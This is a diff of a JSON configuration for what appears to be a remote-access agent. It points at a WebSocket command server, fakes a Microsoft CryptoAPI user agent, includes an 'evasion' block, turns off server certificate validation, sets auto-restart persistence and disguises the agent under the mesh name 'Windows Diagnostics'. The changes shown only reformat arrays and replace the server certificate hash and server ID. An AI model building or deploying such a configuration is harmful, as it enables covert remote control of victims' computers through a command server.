@@ -22,7 +22,9 @@
     "primaryEndpoint": "wss://agents.high.support:4445/agent.ashx",
     "sni": null,
     "hostHeader": null,
-    "alpn": ["http/1.1"],
+    "alpn": [
+      "http/1.1"
+    ],
     "userAgent": "Microsoft-CryptoAPI/10.0",
     "connectionTimeout": 30,
     "retryAttempts": 5,
@@ -79,7 +81,11 @@
       "enabled": true,
       "resetPeriod": 86400,
       "restartDelay": 10000,
-      "actions": ["restart", "restart", "restart"]
+      "actions": [
+        "restart",
+        "restart",
+        "restart"
+      ]
     }
   },
   "evasion": {
@@ -100,7 +106,7 @@
     "mutualTLS": false,
     "validateServerCert": false,
     "enforceSigning": false,
-    "serverCertHash": "BC7E0DCFDBE4298959C367D398357AF4F4C39396EE1C9289AC25707C25B4294C",
+    "serverCertHash": "283DE2DD8539007F64853D3CE7C7D4C0562A8AD9DD100FDB31D08B3DCB4FB05815596C62A10A5459C84B14B4171252DF",
     "allowedSigners": [
       {
         "thumbprint": "724D7C2188A239EEB7E1823181347581DC83A4B1",
@@ -115,7 +121,7 @@
     "meshName": "Windows Diagnostics",
     "meshType": "2",
     "meshId": "sdBWgAtTM6VK18fC7gLtdRBZq0NAjzqg@1x9MMWNudEQZ3FoOGkXXLFyoyEhXL2Z",
-    "serverId": "BC7E0DCFDBE4298959C367D398357AF4F4C39396EE1C9289AC25707C25B4294C",
+    "serverId": "283DE2DD8539007F64853D3CE7C7D4C0562A8AD9DD100FDB31D08B3DCB4FB05815596C62A10A5459C84B14B4171252DF",
     "serverUrl": "wss://agents.high.support:4445/agent.ashx",
     "autoRegister": true,
     "installFlags": "0"
